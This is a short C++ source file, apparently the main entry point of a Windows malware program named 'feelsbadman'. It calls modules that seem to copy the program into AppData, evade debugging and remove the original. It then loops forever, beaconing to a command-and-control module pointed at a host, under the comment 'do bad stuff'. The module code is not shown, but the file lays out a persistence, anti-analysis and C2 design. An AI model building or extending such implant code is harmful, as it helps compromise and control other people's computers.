// feelsbadman.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "C2.h"
#include "CP.h"
#include "RM.h"
#include "DB.h"
#include "UTIL.h";
#include <iostream>


int main()
{
	// instantiate modules
	CP copyModule;
	C2 connModule;
	RM remvModule;
	DB debgModule;
	UTIL util;
	util.isExecutingFromAppData();

	if (!util.isExecutingFromAppData()) {
		copyModule.execute();
		debgModule.execute();
		remvModule.execute();
		return 0;
	}


	connModule.setPathName("/");
	connModule.setHostName("www.google.com");

	while (true) {
		// do bad stuff
		Sleep(20000);
		debgModule.execute();
		connModule.execute();
	}
}

